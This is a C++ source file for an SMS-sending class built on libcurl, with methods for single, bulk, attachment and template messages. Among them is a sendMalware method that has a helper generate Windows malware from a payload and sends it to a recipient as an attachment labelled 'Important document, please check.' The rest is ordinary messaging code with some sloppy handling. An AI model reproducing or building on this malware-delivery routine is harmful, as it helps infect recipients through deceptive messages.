#include "SMSSender.h"
#include "TemplateLoader.h"
#include "Logger.h"
#include "MCreator.h"
#include <curl/curl.h>
#include <iostream>
#include <stdexcept>
#include <thread>
#include <chrono>
#include <sstream>

SMSSender::SMSSender(const std::string &authToken) : authToken(authToken), apiUrl("https://api.smsprovider.com/send"), templateLoader(nullptr) {}

void SMSSender::sendMessage(const std::string &recipient, const std::string &message) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    logSMSSending(recipient, preparedMessage);
    std::string url = apiUrl + "?to=" + recipient + "&message=" + curl_easy_escape(curl_easy_init(), preparedMessage.c_str(), preparedMessage.length());

    if (!retryOnFailure(url, "")) {
        Logger::log(Logger::ERROR, "Failed to send message after multiple attempts");
    }
}

void SMSSender::sendBulkMessages(const std::vector<std::string> &recipients, const std::string &message) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    for (const auto &recipient : recipients) {
        logSMSSending(recipient, preparedMessage);
        sendMessage(recipient, preparedMessage);
    }
}

void SMSSender::sendMessageWithAttachment(const std::string &recipient, const std::string &message, const std::string &attachmentPath) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    logSMSSending(recipient, preparedMessage);

    CURL *curl;
    CURLcode res;

    curl_mime *form = nullptr;
    curl_mimepart *field = nullptr;

    curl = curl_easy_init();
    if (curl) {
        form = curl_mime_init(curl);
        field = curl_mime_addpart(form);
        curl_mime_name(field, "to");
        curl_mime_data(field, recipient.c_str(), CURL_ZERO_TERMINATED);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "message");
        curl_mime_data(field, preparedMessage.c_str(), CURL_ZERO_TERMINATED);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "attachment");
        curl_mime_filedata(field, attachmentPath.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, apiUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            Logger::log(Logger::ERROR, "Failed to send SMS with attachment: " + std::string(curl_easy_strerror(res)));
            throw std::runtime_error("Failed to send SMS with attachment: " + std::string(curl_easy_strerror(res)));
        }

        curl_mime_free(form);
        curl_easy_cleanup(curl);
    } else {
        Logger::log(Logger::ERROR, "Failed to initialize CURL");
        throw std::runtime_error("Failed to initialize CURL");
    }
}

void SMSSender::sendMalware(const std::string &recipient, const std::string &payloadPath) {
    std::string malwarePath = MCreator::createWindowsMalware(payloadPath);
    sendMessageWithAttachment(recipient, "Important document, please check.", malwarePath);
}

bool SMSSender::sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params) {
    if (!templateLoader) {
        Logger::log(Logger::ERROR, "Template loader not set");
        return false;
    }

    std::string templateContent;
    if (!templateLoader->loadTemplate(templateName, templateContent)) {
        Logger::log(Logger::ERROR, "Failed to load template: " + templateName);
        return false;
    }

    for (const auto &param : params) {
        auto placeholder = "{" + param.first + "}";
        auto pos = templateContent.find(placeholder);
        if (pos != std::string::npos) {
            templateContent.replace(pos, placeholder.length(), param.second);
        }
    }

    sendMessage(recipient, templateContent);
    return true;
}

void SMSSender::setTemplateLoader(const std::shared_ptr<TemplateLoader> &loader) {
    templateLoader = loader;
}

std::string SMSSender::prepareMessage(const std::string &message) {
    return message;
}

void SMSSender::sendHTTPRequest(const std::string &url, const std::string &payload) {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        if (!payload.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
        }

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            Logger::log(Logger::ERROR, "Failed to send HTTP request: " + std::string(curl_easy_strerror(res)));
            throw std::runtime_error("Failed to send HTTP request: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_cleanup(curl);
    } else {
        Logger::log(Logger::ERROR, "Failed to initialize CURL");
        throw std::runtime_error("Failed to initialize CURL");
    }
}

void SMSSender::logSMSSending(const std::string &recipient, const std::string &message) {
    std::cout << "Sending SMS to " << recipient << ": " << message << std::endl;
    Logger::log(Logger::INFO, "Sending SMS to " + recipient + ": " + message);
}

void SMSSender::handleApiResponse(const std::string &response) {
    Logger::log(Logger::INFO, "API Response: " + response);
}

bool SMSSender::retryOnFailure(const std::string &url, const std::string &payload, int retries) {
    while (retries > 0) {
        try {
            sendHTTPRequest(url, payload);
            return true;
        } catch (const std::exception &e) {
            Logger::log(Logger::WARNING, "Retrying send message: " + std::string(e.what()));
            --retries;
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
    return false;
}





